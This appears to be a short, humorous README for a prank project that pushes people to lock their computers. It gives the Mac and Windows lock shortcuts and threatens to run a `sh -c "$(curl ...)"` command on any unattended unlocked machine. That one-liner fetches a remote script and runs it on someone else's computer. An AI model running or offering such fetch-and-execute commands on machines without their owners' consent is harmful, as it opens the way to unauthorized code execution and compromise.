It's a moment when I show up, got 'em sayin', "Wow" (Wow, wow)

It's very simple to lock your computer before getting up and going somewhere else without your computer. Unfortunately, not many people do.

On Macs, it's as simple as `cmd + ctrl + q`.
On Windows, it's as simple as `win + L`

This is my declaration.

```
Needless to say, I keep it in git
Security boo boo, nevertheless (yeah)
Callin' a shell script, baby, you'll be hacked (hacked)
Check your background, baby, you've been hacked (hacked)
```

I will run this

```
sh -c "$(curl -fsSL https://raw.githubusercontent.com/chrisarevir/malone-protocol/master/protocol.sh)"
```

if you leave your computer unlocked and walk away.

While we may be getting more secure to cyber-based espionage, or external even external hackers, there's nothing that beats a little social engineering. Letting the wrong person get physical access to your computer can be harmful, as this could very easily have turned into a real virus.
